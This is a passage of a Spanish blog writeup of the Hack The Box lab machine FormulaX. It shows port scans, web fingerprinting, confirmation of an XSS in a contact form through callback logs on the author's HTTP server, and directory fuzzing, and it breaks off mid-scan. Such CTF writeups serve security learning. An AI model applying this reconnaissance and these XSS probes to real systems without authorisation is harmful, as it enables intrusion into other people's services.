<!doctype html>
<html lang="es">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="shortcut icon" href="/pointed.png" />

<title>Hack The Box: FormulaX Writeup | Hard&nbsp;|&nbsp;Bajo el Teclado</title>
<meta
  name="title"
  content="Hack The Box: FormulaX Writeup | Hard"
/>
<meta
  name="description"
  content="Hack The Box: FormulaX Writeup
TCP Enumeration






1$ rustscan -a 10.129.230.190 --ulimit 5000 -g
210.129.230.190 -&gt; [22,80]






 1$ nmap -p22,80 -sCV 10.129.230.190 -Pn -oN allPorts
 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-31 18:19 CEST
 3Nmap scan report for 10.129.230.190
 4Host is up (0.038s latency).
 5
 6PORT   STATE SERVICE VERSION
 722/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
 8| ssh-hostkey: 
 9|   256 5f:b2:cd:54:e4:47:d1:0e:9e:81:35:92:3c:d6:a3:cb (ECDSA)
10|_  256 b9:f0:0d:dc:05:7b:fa:fb:91:e6:d0:b4:59:e6:db:88 (ED25519)
1180/tcp open  http    nginx 1.18.0 (Ubuntu)
12| http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
13|_Requested resource was /static/index.html
14|_http-cors: GET POST
15|_http-server-header: nginx/1.18.0 (Ubuntu)
16Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
17
18Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
19Nmap done: 1 IP address (1 host up) scanned in 7.93 seconds
UDP Enumeration
No vemos nada abierto por UDP"
/>
<meta
  name="keywords"
  content="HackTheBox,FormulaX,Writeup,Cybersecurity,Penetration Testing,CTF,XSS,Abusing Web Sockets,Abusing LibreOffice Socket,User Pivoting,Reverse Shell,Privilege Escalation,RCE,Exploit,Abusing simple-git,Abusing MongoDB,Password Cracking,Port Forwarding,User Pivoting,Creating Admin Account in LibreNMS,Abusing LibreNMS,Credentials Reuse,Linux,"
/>

  <meta name="author" content="AndrÃ©s Del Cerro" />




<meta property="og:url" content="http://localhost:1313/writeups/formulax---hackthebox/">
  <meta property="og:site_name" content="Bajo el Teclado">
  <meta property="og:title" content="Hack The Box: FormulaX Writeup | Hard">
  <meta property="og:description" content="Hack The Box: FormulaX Writeup TCP Enumeration 1$ rustscan -a 10.129.230.190 --ulimit 5000 -g 210.129.230.190 -&gt; [22,80]1$ nmap -p22,80 -sCV 10.129.230.190 -Pn -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-31 18:19 CEST 3Nmap scan report for 10.129.230.190 4Host is up (0.038s latency). 5 6PORT STATE SERVICE VERSION 722/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) 8| ssh-hostkey: 9| 256 5f:b2:cd:54:e4:47:d1:0e:9e:81:35:92:3c:d6:a3:cb (ECDSA) 10|_ 256 b9:f0:0d:dc:05:7b:fa:fb:91:e6:d0:b4:59:e6:db:88 (ED25519) 1180/tcp open http nginx 1.18.0 (Ubuntu) 12| http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8). 13|_Requested resource was /static/index.html 14|_http-cors: GET POST 15|_http-server-header: nginx/1.18.0 (Ubuntu) 16Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 17 18Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 19Nmap done: 1 IP address (1 host up) scanned in 7.93 secondsUDP Enumeration No vemos nada abierto por UDP">
  <meta property="og:locale" content="es">
  <meta property="og:type" content="article">
    <meta property="article:section" content="writeups">
    <meta property="article:published_time" content="2024-07-31T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-07-31T00:00:00+00:00">
    <meta property="article:tag" content="HackTheBox">
    <meta property="article:tag" content="FormulaX">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="Cybersecurity">
    <meta property="article:tag" content="Penetration Testing">
    <meta property="article:tag" content="CTF">





  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Hack The Box: FormulaX Writeup | Hard">
  <meta name="twitter:description" content="Hack The Box: FormulaX Writeup TCP Enumeration 1$ rustscan -a 10.129.230.190 --ulimit 5000 -g 210.129.230.190 -&gt; [22,80]1$ nmap -p22,80 -sCV 10.129.230.190 -Pn -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-31 18:19 CEST 3Nmap scan report for 10.129.230.190 4Host is up (0.038s latency). 5 6PORT STATE SERVICE VERSION 722/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) 8| ssh-hostkey: 9| 256 5f:b2:cd:54:e4:47:d1:0e:9e:81:35:92:3c:d6:a3:cb (ECDSA) 10|_ 256 b9:f0:0d:dc:05:7b:fa:fb:91:e6:d0:b4:59:e6:db:88 (ED25519) 1180/tcp open http nginx 1.18.0 (Ubuntu) 12| http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8). 13|_Requested resource was /static/index.html 14|_http-cors: GET POST 15|_http-server-header: nginx/1.18.0 (Ubuntu) 16Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 17 18Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 19Nmap done: 1 IP address (1 host up) scanned in 7.93 secondsUDP Enumeration No vemos nada abierto por UDP">





  <meta itemprop="name" content="Hack The Box: FormulaX Writeup | Hard">
  <meta itemprop="description" content="Hack The Box: FormulaX Writeup TCP Enumeration 1$ rustscan -a 10.129.230.190 --ulimit 5000 -g 210.129.230.190 -&gt; [22,80]1$ nmap -p22,80 -sCV 10.129.230.190 -Pn -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-31 18:19 CEST 3Nmap scan report for 10.129.230.190 4Host is up (0.038s latency). 5 6PORT STATE SERVICE VERSION 722/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) 8| ssh-hostkey: 9| 256 5f:b2:cd:54:e4:47:d1:0e:9e:81:35:92:3c:d6:a3:cb (ECDSA) 10|_ 256 b9:f0:0d:dc:05:7b:fa:fb:91:e6:d0:b4:59:e6:db:88 (ED25519) 1180/tcp open http nginx 1.18.0 (Ubuntu) 12| http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8). 13|_Requested resource was /static/index.html 14|_http-cors: GET POST 15|_http-server-header: nginx/1.18.0 (Ubuntu) 16Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 17 18Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 19Nmap done: 1 IP address (1 host up) scanned in 7.93 secondsUDP Enumeration No vemos nada abierto por UDP">
  <meta itemprop="datePublished" content="2024-07-31T00:00:00+00:00">
  <meta itemprop="dateModified" content="2024-07-31T00:00:00+00:00">
  <meta itemprop="wordCount" content="3073">
  <meta itemprop="keywords" content="HackTheBox,FormulaX,Writeup,Cybersecurity,Penetration Testing,CTF,XSS,Abusing Web Sockets,Abusing LibreOffice Socket,Reverse Shell,Privilege Escalation,RCE,Exploit,Abusing Simple-Git,Abusing MongoDB,Password Cracking,Port Forwarding,User Pivoting,Creating Admin Account in LibreNMS,Abusing LibreNMS,Credentials Reuse,Linux">
<meta name="referrer" content="no-referrer-when-downgrade" />

    
    <link href="/simple.min.css" rel="stylesheet" />

    
    <link href="/style.min.css" rel="stylesheet" />

    

    
</head>

  <body>
    <header>
      <nav>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZHDKLM7DD2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-ZHDKLM7DD2');
</script>


  <a
    href="/"
    
    >Home</a
  >

  <a
    href="/about/"
    
    >About me</a
  >

  <a
    href="/writeups/"
    
    >Writeup&#39;s</a
  >


</nav>
<div style="display: flex; justify-content: center; align-items: center">
  <div style="display: flex; width: 20rem; gap: 2rem;">
    <img src="yo.png" alt="">
    <h1>Hack The Box: FormulaX Writeup | Hard</h1>
  </div>
</div>


    </header>
    <main>
      
  
  
  <content>
    <h1 id="hack-the-box-formulax-writeup">Hack The Box: FormulaX Writeup</h1>
<h1 id="tcp-enumeration">TCP Enumeration</h1>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ rustscan -a 10.129.230.190 --ulimit <span style="color:#ff0;font-weight:bold">5000</span> -g
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>10.129.230.190 -&gt; [22,80]</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ nmap -p22,80 -sCV 10.129.230.190 -Pn -oN allPorts
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-31 18:19 CEST
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Nmap scan report <span style="color:#fff;font-weight:bold">for</span> 10.129.230.190
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Host is up (0.038s latency).
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>|   <span style="color:#ff0;font-weight:bold">256</span> 5f:b2:cd:54:e4:47:d1:0e:9e:81:35:92:3c:d6:a3:cb (ECDSA)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>|_  <span style="color:#ff0;font-weight:bold">256</span> b9:f0:0d:dc:05:7b:fa:fb:91:e6:d0:b4:59:e6:db:88 (ED25519)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>80/tcp open  http    nginx 1.18.0 (Ubuntu)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>| http-title: Site doesn<span style="color:#f00">&#39;</span>t have a title (text/html; charset=UTF-8).
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>|_Requested resource was /static/index.html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>|_http-cors: GET POST
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>Nmap <span style="color:#fff;font-weight:bold">done</span>: <span style="color:#ff0;font-weight:bold">1</span> IP address (<span style="color:#ff0;font-weight:bold">1</span> host up) scanned in 7.93 seconds</span></span></code></pre></div>
<h1 id="udp-enumeration">UDP Enumeration</h1>
<p>No vemos nada abierto por UDP</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ sudo nmap --top-ports <span style="color:#ff0;font-weight:bold">1500</span> 10.129.230.190 --min-rate <span style="color:#ff0;font-weight:bold">5000</span> -n -Pn -sU -oN allPorts.UDP
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-31 18:20 CEST
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Nmap scan report <span style="color:#fff;font-weight:bold">for</span> 10.129.230.190
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Host is up (0.037s latency).
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>Not shown: <span style="color:#ff0;font-weight:bold">1494</span> open|filtered udp ports (no-response)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>PORT      STATE  SERVICE
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>19998/udp closed unknown
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>30465/udp closed unknown
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>34861/udp closed unknown
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>42508/udp closed candp
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>49163/udp closed unknown
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>49207/udp closed unknown
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>Nmap <span style="color:#fff;font-weight:bold">done</span>: <span style="color:#ff0;font-weight:bold">1</span> IP address (<span style="color:#ff0;font-weight:bold">1</span> host up) scanned in 0.81 seconds</span></span></code></pre></div>
<h1 id="web-enumeration">Web Enumeration</h1>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ whatweb http://10.129.230.190
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>http://10.129.230.190 [<span style="color:#ff0;font-weight:bold">302</span> Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.230.190], RedirectLocation[/static/index.html], UncommonHeaders[access-control-allow-origin,access-control-allow-credentials], X-Powered-By[Express], nginx[1.18.0]
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>http://10.129.230.190/static/index.html [<span style="color:#ff0;font-weight:bold">200</span> OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.230.190], PasswordField[psw], Script, UncommonHeaders[access-control-allow-origin,access-control-allow-credentials], X-Powered-By[Express], nginx[1.18.0]</span></span></code></pre></div>
<p>Vemos un panel de inicio de sesiÃ³n.
<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
<p>DespuÃ©s de hacernos una cuenta de usuario, podemos ver que este servicio web ofrece una especie de chatbot.
<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
<p>Si nos damos cuenta, esta es una pÃ¡gina estÃ¡tica en <code>html</code> por lo cual por detrÃ¡s se debe de estar empleando javascript para la comunicaciÃ³n con algÃºn servidor.
<img src="images/Screenshot_3.png" alt="Write-up Image">
Y podemos comprobar el uso de websockets.</p>
<p>En el apartado de <code>Contact Us</code> , haciendo unas pruebas podemos ver que se acontece un XSS.
<img src="images/Screenshot_4.png" alt="Write-up Image"></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span> python3 -m http.server <span style="color:#ff0;font-weight:bold">8080</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Serving HTTP on 0.0.0.0 port <span style="color:#ff0;font-weight:bold">8080</span> (http://0.0.0.0:8080/) ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>10.129.230.190 - - [31/Jul/2024 18:24:55] code 404, message File not found
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>10.129.230.190 - - [31/Jul/2024 18:24:55] <span style="color:#0ff;font-weight:bold">&#34;GET /img.png HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">404</span> -
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>10.129.230.190 - - [31/Jul/2024 18:24:59] code 404, message File not found
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>10.129.230.190 - - [31/Jul/2024 18:24:59] <span style="color:#0ff;font-weight:bold">&#34;GET /img.png HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">404</span> -
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>10.129.230.190 - - [31/Jul/2024 18:25:01] code 404, message File not found
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>10.129.230.190 - - [31/Jul/2024 18:25:01] <span style="color:#0ff;font-weight:bold">&#34;GET /img.png HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">404</span> -
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>10.129.230.190 - - [31/Jul/2024 18:25:06] code 404, message File not found
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>10.129.230.190 - - [31/Jul/2024 18:25:06] <span style="color:#0ff;font-weight:bold">&#34;GET /img.png HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">404</span> -
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>10.129.230.190 - - [31/Jul/2024 18:25:08] code 404, message File not found
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>10.129.230.190 - - [31/Jul/2024 18:25:08] <span style="color:#0ff;font-weight:bold">&#34;GET /img.png HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">404</span> -</span></span></code></pre></div>
<p>No podemos hacer un Cookie hijacking ya que estÃ¡ activado el <code>HttpOnly</code>
<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
<p>DespuÃ©s de investigar un rato, me diÃ³ por fuzzear el sitio web ya que todavÃ­a no lo habÃ­a hecho.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ feroxbuster -u http://10.129.230.190 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>                                                                                          
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span> ___  ___  __   __     __      __         __   ___
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>|__  |__  |__) |__) | /  <span style="color:#0ff;font-weight:bold">`</span>    /  <span style="color:#0ff;font-weight:bold">\ \_</span>/ | |  <span style="color:#0ff;font-weight:bold">\ </span>|__
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>|    |___ |  <span style="color:#0ff;font-weight:bold">\ </span>|  <span style="color:#0ff;font-weight:bold">\ </span>| <span style="color:#0ff;font-weight:bold">\_</span>_,    <span style="color:#0ff;font-weight:bold">\_</span>_/ / <span style="color:#0ff;font-weight:bold">\ </span>| |__/ |___
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>by Ben <span style="color:#0ff;font-weight:bold">&#34;epi&#34;</span> Risher ğŸ¤“                 ver: 2.10.4
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span> ğŸ¯  Target Url            â”‚ http://10.129.230.190
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span> ğŸš€  Threads               â”‚ <span style="color:#ff0;font-weight:bold">50</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span> ğŸ“–  Wordlist              â”‚ /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span> ğŸ‘Œ  Status Codes          â”‚ All Status Codes!
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span> ğŸ’¥  Timeout (secs)        â”‚ <span style="color:#ff0;font-weight:bold">7</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span> ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.10.4
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span> ğŸ”  Extract Links         â”‚ <span style="color:#fff;font-weight:bold">true</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span> ğŸ  HTTP methods          â”‚ [GET]
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span> ğŸ”ƒ  Recursion Depth       â”‚ <span style="color:#ff0;font-weight:bold">4</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span> ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span><span style="color:#ff0;font-weight:bold">404</span>      GET       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span><span style="color:#ff0;font-weight:bold">302</span>      GET        1l        4w       40c http://10.129.230.190/ =&gt; http://10.129.230.190/static/index.html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span><span style="color:#ff0;font-weight:bold">301</span>      GET       10l       16w      173c http://10.129.230.190/img =&gt; http://10.129.230.190/img/
